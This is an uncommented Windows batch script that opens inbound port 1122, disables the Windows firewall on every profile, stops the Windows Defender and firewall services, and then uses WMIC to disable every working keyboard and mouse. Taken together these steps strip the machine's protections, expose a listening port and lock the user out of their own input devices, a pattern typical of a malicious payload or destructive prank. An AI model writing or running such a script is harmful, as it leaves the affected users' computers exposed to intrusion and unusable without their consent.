@echo off
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=1122
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=1122
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
net stop "Windows Defender Service"
net stop "Windows Firewall"
setlocal enabledelayedexpansion

for /f "skip=1 delims=" %%a in ('wmic path Win32_PnPEntity where "DeviceID like '%%Keyboard%%' or DeviceID like '%%Mouse%%'" get DeviceID^,Status /format:list') do (
    set "line=%%a"
    if "!line:~0,8!" == "DeviceID" (
        set "device_id=!line:~9!"
    ) else if "!line:~0,6!" == "Status" (
        set "status=!line:~7!"
        if "!status!" == "OK" (
            wmic path Win32_PnPEntity where "DeviceID='!device_id!'" call Disable
        )
    )
)
